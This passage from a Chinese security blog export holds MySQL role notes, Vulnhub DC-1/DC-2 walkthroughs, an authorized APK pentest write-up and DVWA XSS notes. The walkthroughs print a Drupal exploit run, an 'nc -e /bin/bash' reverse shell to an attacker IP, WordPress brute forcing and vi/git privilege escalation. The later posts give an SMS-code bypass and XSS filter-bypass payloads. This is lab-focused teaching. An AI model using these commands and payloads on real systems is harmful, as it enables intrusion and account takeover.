href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h3><h3 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h3><p>通常，MySQL 数据库拥有多个相同权限集合的用户。以前，向多个用户授予和撤销权限的唯一方法是单独更改每个用户的权限，假如用户数量比较多的时候，这是非常耗时的。<a href="https://www.yiibai.com/mysql/roles.html" target="_blank" rel="noopener">MySql 角色</a></p><p>为了用户权限管理更容易，MySQL提供了一个名为<code>role</code>的新对象，它是一个命名的特权集合。</p><p>如果要向多个用户授予相同的权限集，则应如下所示：</p><ul><li><em>首先</em>，创建新的角色。</li><li><em>第二</em>，授予角色权限。</li><li><em>第三</em>，授予用户角色。</li></ul><p>如果要更改用户的权限，则需要仅更改授权角色的权限。这些更改角色的权限将对授予角色的所有用户生效。</p><p>假设您开发了一个使用<code>crmdb</code>数据库的应用程序。要与<code>crmdb</code>数据库进行交互，您需要为需要完全访问数据库的开发人员创建帐户。此外，需要为仅需读取访问权限的用户创建帐户，以及为读取/写入访问权限的用户创建帐户。</p><p>要避免单独为每个用户帐户授予权限，您可以创建一组角色，并为每个用户帐户授予相应的角色。</p><p>要创建新角色，请使用<code>CREATE ROLE</code>语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">5.2在学生管理数据库上创建两个角色R1和R2，把你这个用户放入R1和把你同学的用户放入角色R2中。</span><br><span class="line">create role if not exists &apos;R1&apos;,&apos;R2&apos;；</span><br><span class="line">GRANT R1 TO brain@localhost;</span><br><span class="line">GRANT R2 TO fuck@localhost;</span><br><span class="line"></span><br><span class="line">5.3给角色R1授权，使其可以查询学生管理数据库中的student表以及查询视图math_stu。</span><br><span class="line">grant select on studentinfo.student to R1;</span><br><span class="line">set default role R1 to brain@localhost;</span><br><span class="line">要在每次用户帐户连接到数据库服务器时指定哪些角色应该处于活动状态，请使用SET DEFAULT ROLE语句。</span><br><span class="line"></span><br><span class="line">5.4给角色R2授权，使其可以插入和更新学生管理数据库中的student表</span><br><span class="line">grant insert,update on studentinfo.student to R2;</span><br><span class="line">set default role R2 to fuck@localhost;</span><br><span class="line"></span><br><span class="line">5.5请分别以你自己名字命名的用户和你同学（汉语拼音）的名字命名的用户分别登录学生管理数据库对student表查询，再对student表进行插入和更新，看看分别是什么结果。</span><br><span class="line"> mysql -h localhost -u brain -p 123456</span><br><span class="line"> select * from student; //此时用户是R1，查询成功，但是无法使用 insert 或者 update 因为我们只赋予了他一个权限。</span><br><span class="line"> </span><br><span class="line">5.6 把角色R1的中对student表查询的权限收回。</span><br><span class="line">REVOKE SELECT ON studentinfo.student from R1;</span><br><span class="line"></span><br><span class="line">5.7再次以你自己名字命名的用户登录学生管理数据库对student表查询看是什么结果。</span><br></pre></td></tr></table></figure><h2 id="数据库完整性"><a href="#数据库完整性" class="headerlink" title="数据库完整性"></a>数据库完整性</h2><p>数据库的完整性 ( integrity ) 是指数据的正确性 ( correctness) 和相容性 (compat-ability) .</p><p>为了维护数据库的完整性，需要实现：</p><ul><li>提供定义完整性约束条件的机制</li><li>提供完整性检查方法：一般在 <code>INSERT,UPDATE,DELETE</code> 语句执行后开始检查，也可以在事务提交时检查。</li><li>进行违约处理</li></ul><p>关系数据库管理系统使得完整性控制成为其核心支持的功能，从而能够为所有用户和应用提供一致的数据库完整性。</p><h3 id="实体完整性"><a href="#实体完整性" class="headerlink" title="实体完整性"></a>实体完整性</h3><p>关系模型的实体完整性在 <code>CREATE TABLE</code> 中用 <code>PRIMARY KEY</code> 定义。单属性码有两种说明方法：列级约束条件和表级约束条件；多属性码只有表级约束条件。</p><h4 id="实体完整性检查和违约处理"><a href="#实体完整性检查和违约处理" class="headerlink" title="实体完整性检查和违约处理"></a>实体完整性检查和违约处理</h4><p>定义完关系的主码之后，每当用户程序对基本表插入一条记录或者对主码列进行更新操作时，会进行实体完整性检查：</p><ul><li>检查主码是否唯一，不唯一则拒绝插入或修改</li><li>检查主码的各个属性是否为空，有一个为空就拒绝插入或修改</li></ul><p>使用<code>B+</code> 索引树来查找基本表是否已经存在新的主码值。</p><h3 id="参照完整性"><a href="#参照完整性" class="headerlink" title="参照完整性"></a>参照完整性</h3><p>关系模型的参照完整性在 <code>CREATE TABLE</code> 中用 <code>FOREIGN KEY</code> 短语定义哪些列为外码，用 <code>PERFERENCES</code> 短语指明这些外码参照哪些表的主码。</p><h4 id="参照完整性检查和违约处理"><a href="#参照完整性检查和违约处理" class="headerlink" title="参照完整性检查和违约处理"></a>参照完整性检查和违约处理</h4><p>参照完整性将两个表中的相应元组联系起来了。因此，对被参照表和参照表进行增删改操作可能破坏参照完整性，必须检查两个表的相容性。</p><p>当相容性发生不一致时，系统可以采用一下策略加以处理：</p><ul><li>拒绝执行- <code>NO ACTION</code> ：默认操作</li><li>级联操作- <code>CASCADE</code> : 当删除或修改被参照表的一个元组导致与参照表的不一致时，删除或修改参照表中的所有导致不一致的元组。</li><li>设置为空值 ：当删除或修改被参照表的一个元组时造成了不一致，则将参照表中的所有造成不一致的元组的对应属性设置为空值。</li></ul><p>对于参照完整性，除了应该定义外码，还应定义外码是否允许空值。</p><h3 id="用户定义的完整性"><a href="#用户定义的完整性" class="headerlink" title="用户定义的完整性"></a>用户定义的完整性</h3><p>针对某一具体应用的数据必须满足的语义条件。</p><h4 id="属性上的约束条件"><a href="#属性上的约束条件" class="headerlink" title="属性上的约束条件"></a>属性上的约束条件</h4><ul><li><code>NOT NULL</code> 列值非空</li><li><code>UNIQUE</code> 列值唯一</li><li><code>CHECK</code> 检查列值是否满足一个条件表达式</li></ul><p>插入元组或修改属性的值时，关系数据库管理系统将检查属性上的约束条件是否被满足，不满足则操作被拒绝执行。</p><h4 id="元组上的约束条件"><a href="#元组上的约束条件" class="headerlink" title="元组上的约束条件"></a>元组上的约束条件</h4><p>在 <code>CREATE TABLE</code> 中可以用<code>CHECK</code> 短句定义元组上的约束条件，即元组级的限制。元组级的限制可以设置不同属性之间的取值的相互约束条件。</p><p>插入元组或修改属性的值时，关系数据库管理系统将检查元组上的约束条件是否被满足，不满足则操作被拒绝执行。</p>]]></content>
      
      
      <categories>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub</title>
      <link href="/2020/04/29/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2020/04/29/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1-渗透测试"><a href="#DC-1-渗透测试" class="headerlink" title="DC-1 渗透测试"></a>DC-1 渗透测试</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>官网下载压缩包后解压出 .ova 文件，然后用 Vmware 打开即可。</p><h2 id="能学到什么？"><a href="#能学到什么？" class="headerlink" title="能学到什么？"></a>能学到什么？</h2><ul><li>arp-scan 进行主机发现</li><li>nmap 扫描主机端口开放和运行的服务情况</li><li>whatweb 指纹识别</li><li>searchsploit 离线漏洞库使用</li><li>nc 反弹shell</li><li>SUID 提权</li></ul><h2 id="Let’s-do-it"><a href="#Let’s-do-it" class="headerlink" title="Let’s do it!"></a>Let’s do it!</h2><p>先扫描一下靶机 IP </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">srp-scan -l</span><br><span class="line">nmap -p- -A 192.168.0.119</span><br></pre></td></tr></table></figure><p><img src="https://wx1.sinaimg.cn/mw690/006boCb9ly1gczksqx4o2j30yn0dfwhj.jpg" alt="主机扫描"></p><p><img src="https://wx4.sinaimg.cn/mw690/006boCb9ly1gczksxvr1ij30ji0h37bw.jpg" alt="端口扫描结果"></p><p>看到 robots.txt 的一些信息。访问之后暂时没有找到靶机的敏感信息。还是先看一下靶机使用的 CMS 版本，找找有没有可利用的漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.0.119</span><br><span class="line">searchsploit drupal 7</span><br></pre></td></tr></table></figure><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkt4dx55j30k50hztj8.jpg" alt="版本探测"></p><p>看到一个通过注入添加账户，我们就用这个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/exploitdb/exploits/php/webapps/34992.py -u root -p root -t http://192.168.0.119</span><br></pre></td></tr></table></figure><p>登陆成功之后我们顺利拿到了 flag3。<strong>PERMS</strong> ? <strong>FIND</strong>?  先找找 flag1 &amp; flag2 吧。</p><p>看了看后台其他地方，没有看到flag的影子，但是找到了一个module上传的地方。同时在上传上方提供的链接那里找到了一个特殊的 module：shell.我们下载下来并上传。</p><p><img src="https://wx4.sinaimg.cn/mw690/006boCb9ly1gczkv7iltzj30yh0fwwjq.jpg" alt="flag3"></p><p><img src="https://wx4.sinaimg.cn/mw690/006boCb9ly1gczkvhebatj30nc0fb0tp.jpg" alt="module上传"></p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkw4vwawj30x40hy77k.jpg" alt="module-shell"></p><p><img src="https://wx1.sinaimg.cn/mw690/006boCb9ly1gczkwagg0oj30lt08et8w.jpg" alt="上传shell成功"></p><p>上传成功之后别忘记在配置 Modules 页面勾选 我们刚上传的 shell ，并且保存配置。接下来，在主页就可以使用这个特殊的 shell 。</p><p>我们先试试 <code>find</code> 命令吧。得到 flag1 并提示我们查看配置文件。先 nc 反弹个 shell 吧。 然后在默认的文件路径下找到配置文件，同时获取了 flag2 和数据库账号密码！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.0.4 7777</span><br></pre></td></tr></table></figure><p><img src="https://wx2.sinaimg.cn/mw690/006boCb9ly1gczkwgbjzxj30qp0dogm5.jpg" alt="使用shell"></p><p><img src="https://wx1.sinaimg.cn/mw690/006boCb9ly1gczkwl1s70j30i2066ta7.jpg" alt="反弹shell"></p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkwos8m3j30l00f7n2z.jpg" alt="flag2"></p><p>现在，我们拿到了数据库账号密码，flag2的提示”爆破和字典攻击不是唯一的获得访问权的方式”，这明显是提醒如何获取flag3的。</p><p>既然我们已经通过其他方式得到了 flag3 ，就先把数据库放一边，再看看flag3 的提示：</p><p><strong>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</strong></p><p>这里我再次使用了find 命令想找找有没有其他的发现，结果 flag4 &amp; thefinalflag 都出现了。与上次的区别在于我这次找的是 <code>flag*</code> 。尝试读取最后的 flag 时发现权限不够。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / | grep flag*</span><br></pre></td></tr></table></figure><p><img src="https://wx2.sinaimg.cn/mw690/006boCb9ly1gczky5tjj3j30jv0con4q.jpg" alt="flag4"></p><p><img src="https://wx4.sinaimg.cn/mw690/006boCb9ly1gczkyb2j3gj30ki0hd0y5.jpg" alt="读取finalflag失败"></p><p><code>Google</code> 了一下 <code>find perm escalate privileges</code> ,找到一篇<a href="https://www.hackingarticles.in/linux-for-pentester-find-privilege-escalation/" target="_blank" rel="noopener">大牛文章</a>，按照文章的方法成功提权，并且读取最后一个 flag ！</p><p><img src="https://wx2.sinaimg.cn/mw690/006boCb9ly1gczkygi4h1j30t10dj40o.jpg" alt="find-suid"></p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkyn8eu5j30h80dmwht.jpg" alt="root权限执行命令"></p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1gczkysuue9j30jr07jwgw.jpg" alt="最后一个flag"></p><h1 id="DC-2-渗透测试"><a href="#DC-2-渗透测试" class="headerlink" title="DC-2 渗透测试"></a>DC-2 渗透测试</h1><h2 id="Info-of-DC-2"><a href="#Info-of-DC-2" class="headerlink" title="Info of DC-2"></a>Info of <a href="https://www.vulnhub.com/entry/dc-2,311/#" target="_blank" rel="noopener">DC-2</a></h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>Just like with DC-1, there are five flags including the final flag.</p><p>And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.</p><p>In short, the only flag that really counts, is the final flag.</p><p>For beginners, <strong>Google is your friend. Well, apart from all the privacy concerns etc etc.</strong></p><p>Installation is simple - download it, unzip it, and then import it into VirtualBox and away you go.</p><p><strong>Please note that you will need to set the hosts file on your pentesting device to something like:</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="number">192.168</span><span class="number">.0</span><span class="number">.131</span> dc<span class="number">-2</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>Obviously, replace 192.168.0.145 with the actual IP address of DC-2.</p></blockquote><h2 id="能学到什么？-1"><a href="#能学到什么？-1" class="headerlink" title="能学到什么？"></a>能学到什么？</h2><ul><li>如何利用 Nmap 进行主机发现并扫描目标主机端口服务开放情况</li><li>CeWl 是什么？怎么用？</li><li>如何利用 WPscan 枚举 WP站点用户</li><li>如何利用 WPscan 爆破后台账号密码</li><li>vi 提权</li><li>Git 提权</li></ul><h2 id="Let’s-do-it-1"><a href="#Let’s-do-it-1" class="headerlink" title="Let’s do it!"></a>Let’s do it!</h2><p>先使用进行 nmap 进行主机发现</p><p><code>nmap -sn 192.168.0.0/24</code></p><p><img src="https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl41xnwvj30j408jgq3.jpg" alt="扫描结果"></p><p>去浏览器搜索发现 <code>192.168.0.131</code> 正是靶机(上文简介中作者提到如果访问靶机不成功记得修改 hosts 文件，将靶机 IP 添加进去)。</p><p>接下来我们简单扫一下端口，我们扫了1000个端口，可以看到开放80，同时也能发现是 wordpress 的站点。</p><p><code>nmap -A 192.168.0.131</code> </p><p><img src="https://wx2.sinaimg.cn/mw690/006boCb9ly1gczl4abh1kj31420iyaqv.jpg" alt="靶机端口信息"> </p><p>接下来，我们浏览目标站点，发现了 flag 内容</p><p><img src="https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl4fhr7aj30sr0gp7a1.jpg" alt="Flag 内容"></p><p>这是第一个 flag ！提示我们可能要用到 cewl 来制作一个字典 进行登陆。</p><blockquote><p>Cewl - Custom Word List generator</p><p>Based on a discussion on <a href="http://wiki.securityweekly.com/wiki/index.php/Episode129" target="_blank" rel="noopener">PaulDotCom episode 129</a> about creating custom word lists by spidering a targets website and  collecting unique words I decided to write CeWL, the Custom Word List  generator. CeWL is a ruby app which spiders a given url to a specified  depth, optionally following external links, and returns a list of words  which can then be used for password crackers such as <a href="http://www.openwall.com/john/" target="_blank" rel="noopener">John the Ripper</a>.     </p><p>可以大致了解到 cewl 是通过爬虫的方式对目标网站进行深度爬取，然后返回可能作为密码的词汇</p></blockquote><p>我们来制作一个密码本吧！</p><p><code>cewl -w dc-2pwd.txt http://dc-2</code></p><p>然后使用 wpscan 来枚举一下用户</p><p> <code>wpscan -e u --url 192.168.0.131</code></p><p><img src="https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl4kx0ogj30v60g4ahu.jpg" alt="用户名"></p><p>除了 <strong>admin</strong> 外，还有 <strong>jerry</strong> 和 <strong>tom</strong> . 我们把用户名保存在 <strong>dc-2user.txt</strong> 中。</p><p>然后来爆破密码</p><p><code>wpscan -P dc-2pwd.txt -U dc-2user.txt --url http://dc-2</code></p><p><img src="https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl4r2fj2j30vm0akaf5.jpg" alt="爆破密码"></p><p>得到两组可用的账号密码:</p><p><strong>jerry / adipiscing</strong></p><p><strong>tom / parturient</strong></p><p>我们去后台(<a href="http://dc-2/wp-admin)登陆进去看到了Flag2。" target="_blank" rel="noopener">http://dc-2/wp-admin)登陆进去看到了Flag2。</a></p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1gczl54khqaj30su0fwq4r.jpg" alt="后台"></p><p>其他的入口？我们再对靶机进行一次全端口扫描</p><p><code>nmap -p- -A 192.168.0.131</code></p><p><img src="https://wx2.sinaimg.cn/mw690/006boCb9ly1gczl58dlv3j30pq0fmgrb.jpg" alt="端口扫描"></p><p>尝试登陆一下 ssh ，用 tom 的账号密码登陆上后发现我们得到的是 restricted shell. 同时我们只有四个命令可以使用。分别是</p><p> <code>less 、ls、scp、vi.</code></p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1gczl5cpiyfj30ns0cvq6w.jpg" alt="rbash"></p><p>我们可以在<a href="https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/" target="_blank" rel="noopener">这里</a>找到一些提权总结。里面提到了使用 <code>vi</code> 提权。</p><p><code>vi flag3.txt</code> 查看一下文本内容</p><blockquote><p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p></blockquote><p>我们需要切换到 jerry 才能继续，我们就利用上文提权总结里的方法利用 <strong>vi</strong> 进行提权：<code>vi</code> 进入交互模式之后直接输入：</p><p><code>!set shell=/bin/sh</code></p><p><code>!shell</code></p><p><img src="https://wx4.sinaimg.cn/mw690/006boCb9ly1gczl5gjui5j30bo0dj0to.jpg" alt="提权到jerry"></p><p>虽然提权切换到 jerry 了，但是看起来还是个 restricted shell.</p><p>我们查看环境变量发现不对劲，修改一下环境变量之后我们就可以执行命令了。也在 flag4 中发现提示我们 git 提权。 </p><p><img src="https://wx1.sinaimg.cn/mw690/006boCb9ly1gczl5msm3jj30f00h440l.jpg" alt="PATH"></p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1gczl61u3wzj30jn083dgw.jpg" alt="flag4.txt"></p><p>还差最后一步！</p><p>还好，我们百度到一篇<a href="https://www.agesec.com/4144.html" target="_blank" rel="noopener">GIt提权文章</a>，查看权限发现可以不用密码就可以以 <strong>root</strong> 身份执行 <strong>git</strong> 命令，同时利用调用命令交互窗口</p><p><code>sudo git help config</code></p><p><code>!/bin/sh</code>   </p><p>即可顺利提权！</p><p><img src="https://wx2.sinaimg.cn/mw690/006boCb9ly1gczl6aztnwj30hk067got.jpg" alt="nopasswd-git"></p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1gczl6gqm7vj30i20dyafx.jpg" alt="finally!"></p><h2 id="Little-tips"><a href="#Little-tips" class="headerlink" title="Little tips"></a>Little tips</h2><p>在使用 WPscan 之前你可能需要升级到最新版本。因为从 2/1/2020 起，WPscan 将放弃维护之前的版本.</p><blockquote><p>We released WPScan 3.7.0 on <a href="https://twitter.com/_WPScan_/status/1172432920159539202" target="_blank" rel="noopener">September 13th 2019</a>, which uses the <a href="https://wpvulndb.com/api" target="_blank" rel="noopener">WPVulnDB API</a> to fetch vulnerability data in real time. On February 1st 2020, we will be deprecating the use of older versions of WPScan, prior to version  3.7.0.</p><p>Anyone using WPScan that is at a version lesser than 3.7.0 will have  to update to at least version 3.7.0, or above, before February 1st 2020.</p></blockquote><p>还有一点需要注意的是升级之后如果想使用他们的漏洞库，必须要到官网进行注册，获得TOKEN。在使用时带上 TOKEN 才能正常使用。</p>]]></content>
      
      
      <categories>
          
          <category> penetration test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP Penetration testing</title>
      <link href="/2019/12/25/Penetration-testing/"/>
      <url>/2019/12/25/Penetration-testing/</url>
      
        <content type="html"><![CDATA[<h1 id="记一次授权的APK渗透测试"><a href="#记一次授权的APK渗透测试" class="headerlink" title="记一次授权的APK渗透测试"></a>记一次授权的APK渗透测试</h1><p>作为一个渗透测试小白，本文的目的是希望能为那些和我一样的小白提供一些测试思路。</p><p>涉及的内容可能比较基础，表哥们见谅。</p><h2 id="APK-解包"><a href="#APK-解包" class="headerlink" title="APK 解包"></a>APK 解包</h2><p>拿到 apk 之后直接用 7-Zip 解压可以得到几个文件夹、一个 <strong>AndroidManifest.xml</strong> 文件、一个dex文件。使用 dex2jar <a href="https://sourceforge.net/projects/dex2jar/" title="工具" target="_blank" rel="noopener">https://sourceforge.net/projects/dex2jar/</a> 将这个dex文件解压会生成一个jar文件，然后使用jd-gui就可以查看java源代码了。</p><p>当然可以从源码里找代码的漏洞，但是一般会有混淆，在这也不做深入讨论。</p><p>上边提到的 xml 文件一定不能发放过，里边涉及到许多重要的配置项，比如：</p><ul><li>AndroidManifest.xml文件中android:debuggable为true。app 可被任意调试</li><li>AndroidManifest.xml文件中android: allowBackup为true。app 数据可以被备份导出。</li><li>等等…</li></ul><p>还有一点在实际测试过程中可能会用到：在对 apk 解压之后可以尝试在 powershell 里边搜一下 <code>db</code> 文件，说不定有敏感信息(为什么这么说，因为我碰到过一次…)</p><pre><code>for /r F:\source-code %i in (*.db) do echo %i </code></pre><h2 id="登陆页面"><a href="#登陆页面" class="headerlink" title="登陆页面"></a>登陆页面</h2><h3 id="用户名可枚举"><a href="#用户名可枚举" class="headerlink" title="用户名可枚举"></a>用户名可枚举</h3><p>输入用户名之后响应用户名不存在，这就是最简单的枚举用户名的情形了。</p><p>这次碰到的是登陆不需要密码，但是要输入已经注册过的用户名，之后会根据用户名发送验证码到对应手机，同时设置了 120s 内不能重新发送，并且验证码 120s 内有效。</p><p>这时候看起来我们没办法通过验证码做什么事，但是在实际测试过程中发现</p><ol><li><p>当我们输入存在的账号之后提示发送成功；</p></li><li><p>重复发送，会响应 120s 内不能重复发送；</p></li><li><p>输入不存在用户会提示发送失败。</p></li></ol><p>所以这个时间限制对用户名枚举其实没什么影响，我们可以通过爆破用户名根据返回的信息来查看用户名是否存在。</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w5qqs0j30ne0j9abm.jpg" alt="枚举用户"></p><p>等等，既然咱都不知道手机号，也不让输密码登陆，就算得到用户名生成社工字典也没法用啊，那拿到了用户名有什么用？</p><p>当然有用，不过要看具体场景，比如下面这个案例</p><h3 id="任意验证码绕过"><a href="#任意验证码绕过" class="headerlink" title="任意验证码绕过"></a>任意验证码绕过</h3><p>当我们登陆时服务端给账号绑定的手机号发送短信验证码，我们输入一个上一步得到的账号，验证码随便输，点击登陆后抓包，登陆失败，发现响应中有两个 code 字段</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w9rlloj30l2070aaa.jpg" alt></p><p>改改试试：</p><p><img src="https://wx1.sinaimg.cn/mw690/006boCb9ly1ga98wgjh7kj30is057mx6.jpg" alt></p><p><strong>It works!</strong></p><h2 id="功能页面"><a href="#功能页面" class="headerlink" title="功能页面"></a>功能页面</h2><p>成功登录之后，各个功能都点点看看，在个人信息页面有一个查询实时在线人数功能，那一栏只显示了人数，旁边并没有箭头</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98wd0il6j307n04bdfo.jpg" alt></p><p>我一度以为那里不能点击(事实上因为数据量太大，加载了好长时间，我直接点返回了，给我的感觉就是这里没有东西)，进去之后就可以看到所有登陆人员的信息了。</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98voejstj30qf09pdh7.jpg" alt="图打码水平实在不够"></p><p>在我尝试了不同用户之后，发现这里的用户信息并没有权限限制，也就是说对所有人都是可见的，明显的权限配置不当。</p><p>除此之外，应用存在几处查询功能，通过BURP 看到返回的数据包都是 JSON 类型</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98wmervqj30m404vt90.jpg" alt></p><p>因为没什么经验，所以就多尝试吗，在 json 那里注入，xxe 都来一遍，没啥用。</p><p>前面还有一个参数，试试？</p><p><img src="https://wx4.sinaimg.cn/mw690/006boCb9ly1ga98x8llxwj30q203f74b.jpg" alt></p><p>有戏！</p><p>试试 xss 吧</p><p><img src="https://wx2.sinaimg.cn/mw690/006boCb9ly1ga98xbyv4fj30q002q74d.jpg" alt></p><p>放到浏览器成功弹窗！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>平时做测试还是要细心，多总结，每一个能输入的地方都不能放过，多试试总是好的。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS 学习</title>
      <link href="/2019/12/25/xss%E5%A4%87%E5%BF%98/"/>
      <url>/2019/12/25/xss%E5%A4%87%E5%BF%98/</url>
      
        <content type="html"><![CDATA[<h1 id="xss备忘"><a href="#xss备忘" class="headerlink" title="xss备忘"></a>xss备忘</h1><p>11/1/2019 10:50:21 AM </p><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="reflected"><a href="#reflected" class="headerlink" title="reflected"></a>reflected</h3><p><strong>low</strong></p><pre><code>&lt;script&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>medium</strong></p><pre><code>&lt;scRiPt&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p><pre><code>&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) {    // Get input    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );    // Feedback for end user    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}?&gt; </code></pre><p>黑名单过滤，采用正则不区分大小写，双写、大小写混淆不行了，但是我们可以使用其他的事件标签：</p><pre><code>&lt;img src onerror=alert(1);&gt;&gt;</code></pre><p><strong>impossible</strong></p><pre><code>&lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) {     // Check Anti-CSRF token     checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );     // Get input     $name = htmlspecialchars( $_GET[ &apos;name&apos; ] );     // Feedback for end user     echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><h2 id="Stored"><a href="#Stored" class="headerlink" title="Stored"></a>Stored</h2><p><strong>low</strong></p><p>name 处长度限制， Message 处尝试 <code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p><p><strong>medium</strong></p><pre><code>$message = strip_tags( addslashes( $message ) );$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$message = htmlspecialchars( $message );// Sanitize name input$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p><code>strip_tages</code> 移除字符串中的 HTML、XML 以及 PHP 标签，但允许使用 <code>&lt;b&gt;</code> 标签。  <code>addslashes</code>  返回在预定义字符(单引号、双引号、反斜杠、NULL)之前添加反斜杠的字符串； <code>htmlspecialchars</code> 对参数进行实体编码，无法再对 <code>message</code> 进行 XSS ，但是 <code>name</code> 处可以通过修改长度进行 xss。</p><pre><code>&lt;sc&lt;script&gt;ript&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p><pre><code>$message = strip_tags( addslashes( $message ) );$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));$message = htmlspecialchars( $message );// Sanitize name input$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p>似曾相识呢😋</p><pre><code>&lt;img src 